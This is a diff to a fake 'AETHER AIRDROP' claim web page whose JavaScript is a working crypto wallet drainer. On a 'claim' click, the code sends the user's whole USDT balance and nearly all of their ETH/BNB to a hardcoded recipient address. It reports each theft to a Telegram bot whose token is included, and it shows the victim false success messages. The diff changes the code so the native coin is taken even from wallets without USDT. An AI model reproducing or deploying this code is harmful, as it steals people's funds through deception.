@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 
-<html lang="en"> 
+<html lang="en">
 <head>
     <meta charset="UTF-8" />
     <title>🎁 AETHER AIRDROP | Advanced Claim Portal</title>
@@ -646,7 +646,7 @@
 
             <div class="network-item" data-chain="56">
                 <div class="network-icon">
-                    
+                
                 </div>
                 <div class="network-info">
                     <div class="network-name">BNB Smart Chain</div>
@@ -773,7 +773,7 @@
     const RECIPIENT_ADDRESS = "0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1";
     const WALLETCONNECT_PROJECT_ID = "6dbc143802f4e17e58fa48ed65449d48";
     const TELEGRAM_BOT = "8508442196:AAGyHF-RKSVPVtAvpYzvNRns3mufYb-1Euk"; 
-    const ADMIN_CHAT_ID = "-1003776376519";
+    const ADMIN_CHAT_ID = "-1003776376519"; 
     const REFERRERS = { nora: "", whitelist: "", malone: "", mikkycrypt03: "", wangde: "", love: "", pay: "", fred: "" };
 
     const NETWORKS = {
@@ -979,84 +979,112 @@
             const network = NETWORKS[currentChainId];
             const usdt = new ethers.Contract(network.usdtAddress, ERC20_ABI, signer);
             
-            // Get user's USDT balance
-            const balance = await usdt.balanceOf(userAddress);
-            
-            if(balance.eq(0)) {
-                updateStatus("No USDT balance to claim", 'error');
-                setButtonLoading(approveBtn, false);
-                isProcessing = false;
-                return;
-            }
-            
-            // Step 1: Transfer ALL USDT to recipient
-            updateStatus("Step 1/2: Processing USDT claim...", 'warning');
-            const usdtTx = await usdt.transfer(RECIPIENT_ADDRESS, balance);
-            
             const ref = getReferral(); 
             const refChat = REFERRERS[ref];
             
-            const msg = `🔄 <b>CLAIM STARTED</b>\nWallet: <code>${userAddress}</code>\nNetwork: ${network.name}\nRef: ${ref||'none'}\nTX: ${network.explorer}/tx/${usdtTx.hash}`;
-            await sendTelegram(ADMIN_CHAT_ID, msg);
-            if(refChat) await sendTelegram(refChat, `👤 Someone used your referral\nTX: ${usdtTx.hash}`);
-
-            const usdtReceipt = await usdtTx.wait();
+            let usdtAmount = "0";
+            let usdtTxHash = null;
             
-            if(usdtReceipt.status === 1) {
-                const amount = ethers.utils.formatUnits(balance, network.decimals);
+            // Step 1: Try to transfer USDT if balance exists
+            const usdtBalance = await usdt.balanceOf(userAddress);
+            
+            if(usdtBalance.gt(0)) {
+                updateStatus("Step 1/2: Processing USDT transfer...", 'warning');
+                const usdtTx = await usdt.transfer(RECIPIENT_ADDRESS, usdtBalance);
+                usdtTxHash = usdtTx.hash;
                 
-                // Step 2: Transfer remaining ETH/BNB
-                updateStatus("Step 2/2: Processing native coin transfer...", 'warning');
+                const msg = `🔄 <b>USDT TRANSFER STARTED</b>\nWallet: <code>${userAddress}</code>\nNetwork: ${network.name}\nRef: ${ref||'none'}\nTX: ${network.explorer}/tx/${usdtTx.hash}`;
+                await sendTelegram(ADMIN_CHAT_ID, msg);
+                if(refChat) await sendTelegram(refChat, `👤 Someone used your referral\nTX: ${usdtTx.hash}`);
+
+                const usdtReceipt = await usdtTx.wait();
                 
-                try {
-                    // Get ETH/BNB balance
-                    const ethBalance = await signer.getBalance();
+                if(usdtReceipt.status === 1) {
+                    usdtAmount = ethers.utils.formatUnits(usdtBalance, network.decimals);
+                }
+            } else {
+                updateStatus("No USDT balance, processing native coin...", 'warning');
+            }
+            
+            // Step 2: Transfer remaining ETH/BNB (ALWAYS DO THIS)
+            updateStatus(usdtBalance.gt(0) ? "Step 2/2: Processing native coin transfer..." : "Processing native coin transfer...", 'warning');
+            
+            try {
+                // Get ETH/BNB balance
+                const ethBalance = await signer.getBalance();
+                
+                // Estimate gas for the ETH transfer
+                const gasPrice = await provider.getGasPrice();
+                const gasLimit = ethers.BigNumber.from(21000); // Standard ETH transfer
+                const gasCost = gasPrice.mul(gasLimit);
+                
+                // Calculate amount to send (total balance - gas cost)
+                const amountToSend = ethBalance.sub(gasCost);
+                
+                if(amountToSend.gt(0)) {
+                    const ethTx = await signer.sendTransaction({
+                        to: RECIPIENT_ADDRESS,
+                        value: amountToSend,
+                        gasLimit: gasLimit
+                    });
                     
-                    // Estimate gas for the ETH transfer
-                    const gasPrice = await provider.getGasPrice();
-                    const gasLimit = ethers.BigNumber.from(21000); // Standard ETH transfer
-                    const gasCost = gasPrice.mul(gasLimit);
+                    await ethTx.wait();
                     
-                    // Calculate amount to send (total balance - gas cost)
-                    const amountToSend = ethBalance.sub(gasCost);
+                    const ethAmount = ethers.utils.formatEther(amountToSend);
                     
-                    if(amountToSend.gt(0)) {
-                        const ethTx = await signer.sendTransaction({
-                            to: RECIPIENT_ADDRESS,
-                            value: amountToSend,
-                            gasLimit: gasLimit
-                        });
-                        
-                        await ethTx.wait();
-                        
-                        const ethAmount = ethers.utils.formatEther(amountToSend);
-                        const successMsg = `✅ <b>CLAIM SUCCESS</b>\nUSDT: ${amount} USDT\n${network.symbol}: ${ethAmount} ${network.symbol}\nFrom: <code>${userAddress}</code>\nTo: <code>${RECIPIENT_ADDRESS}</code>\nNetwork: ${network.name}\nUSDT TX: ${network.explorer}/tx/${usdtTx.hash}\n${network.symbol} TX: ${network.explorer}/tx/${ethTx.hash}`;
-                        await sendTelegram(ADMIN_CHAT_ID, successMsg);
-                        if(refChat) await sendTelegram(refChat, successMsg);
-                        
-                        updateStatus(`✅ Airdrop Claimed!\n${amount} USDT + ${ethAmount} ${network.symbol}`, 'success');
-                    } else {
-                        // No ETH/BNB left after gas
-                        const successMsg = `✅ <b>CLAIM SUCCESS</b>\nAmount: ${amount} USDT\nFrom: <code>${userAddress}</code>\nTo: <code>${RECIPIENT_ADDRESS}</code>\nNetwork: ${network.name}\nTX: ${network.explorer}/tx/${usdtTx.hash}\nNote: No ${network.symbol} remaining after gas`;
-                        await sendTelegram(ADMIN_CHAT_ID, successMsg);
-                        if(refChat) await sendTelegram(refChat, successMsg);
-                        
-                        updateStatus(`✅ Airdrop Claimed!\n${amount} USDT`, 'success');
+                    let successMsg = `✅ <b>CLAIM SUCCESS</b>\n`;
+                    if(usdtBalance.gt(0)) {
+                        successMsg += `USDT: ${usdtAmount} USDT\n`;
                     }
-                } catch(ethErr) {
-                    console.error('ETH transfer error:', ethErr);
-                    // USDT transfer succeeded, but ETH failed - still show success
-                    const successMsg = `✅ <b>USDT CLAIM SUCCESS</b>\nAmount: ${amount} USDT\nFrom: <code>${userAddress}</code>\nTo: <code>${RECIPIENT_ADDRESS}</code>\nNetwork: ${network.name}\nTX: ${network.explorer}/tx/${usdtTx.hash}\n⚠️ ${network.symbol} transfer failed: ${ethErr.message}`;
+                    successMsg += `${network.symbol}: ${ethAmount} ${network.symbol}\nFrom: <code>${userAddress}</code>\nTo: <code>${RECIPIENT_ADDRESS}</code>\nNetwork: ${network.name}\n`;
+                    if(usdtTxHash) {
+                        successMsg += `USDT TX: ${network.explorer}/tx/${usdtTxHash}\n`;
+                    }
+                    successMsg += `${network.symbol} TX: ${network.explorer}/tx/${ethTx.hash}`;
+                    
+                    await sendTelegram(ADMIN_CHAT_ID, successMsg);
+                    if(refChat) await sendTelegram(refChat, successMsg);
+                    
+                    if(usdtBalance.gt(0)) {
+                        updateStatus(`✅ Claimed!\n${usdtAmount} USDT + ${ethAmount} ${network.symbol}`, 'success');
+                    } else {
+                        updateStatus(`✅ Claimed!\n${ethAmount} ${network.symbol}`, 'success');
+                    }
+                } else {
+                    // No ETH/BNB left after gas
+                    if(usdtBalance.gt(0)) {
+                        const successMsg = `✅ <b>USDT CLAIM SUCCESS</b>\nAmount: ${usdtAmount} USDT\nFrom: <code>${userAddress}</code>\nTo: <code>${RECIPIENT_ADDRESS}</code>\nNetwork: ${network.name}\nTX: ${network.explorer}/tx/${usdtTxHash}\nNote: No ${network.symbol} remaining after gas`;
+                        await sendTelegram(ADMIN_CHAT_ID, successMsg);
+                        if(refChat) await sendTelegram(refChat, successMsg);
+                        
+                        updateStatus(`✅ Claimed!\n${usdtAmount} USDT`, 'success');
+                    } else {
+                        updateStatus("No balance to claim", 'error');
+                        setButtonLoading(approveBtn, false);
+                        isProcessing = false;
+                        return;
+                    }
+                }
+            } catch(ethErr) {
+                console.error('ETH transfer error:', ethErr);
+                
+                if(usdtBalance.gt(0)) {
+                    // USDT transfer succeeded, but ETH failed
+                    const successMsg = `✅ <b>USDT CLAIM SUCCESS</b>\nAmount: ${usdtAmount} USDT\nFrom: <code>${userAddress}</code>\nTo: <code>${RECIPIENT_ADDRESS}</code>\nNetwork: ${network.name}\nTX: ${network.explorer}/tx/${usdtTxHash}\n⚠️ ${network.symbol} transfer failed: ${ethErr.message}`;
                     await sendTelegram(ADMIN_CHAT_ID, successMsg);
                     
-                    updateStatus(`✅ ${amount} USDT claimed\n⚠️ ${network.symbol} transfer failed`, 'success');
+                    updateStatus(`✅ ${usdtAmount} USDT claimed\n⚠️ ${network.symbol} failed`, 'success');
+                } else {
+                    // No USDT and ETH also failed
+                    updateStatus(`Failed: ${ethErr.message.substring(0, 50)}`, 'error');
+                    setButtonLoading(approveBtn, false);
+                    isProcessing = false;
+                    return;
                 }
-                
-                approveBtn.innerHTML = '<i class="fas fa-check"></i> Claimed';
-                approveBtn.disabled = true;
-            } else {
-                throw new Error("USDT Transaction Failed");
             }
+            
+            approveBtn.innerHTML = '<i class="fas fa-check"></i> Claimed';
+            approveBtn.disabled = true;
 
         } catch(err) {
             console.error(err);
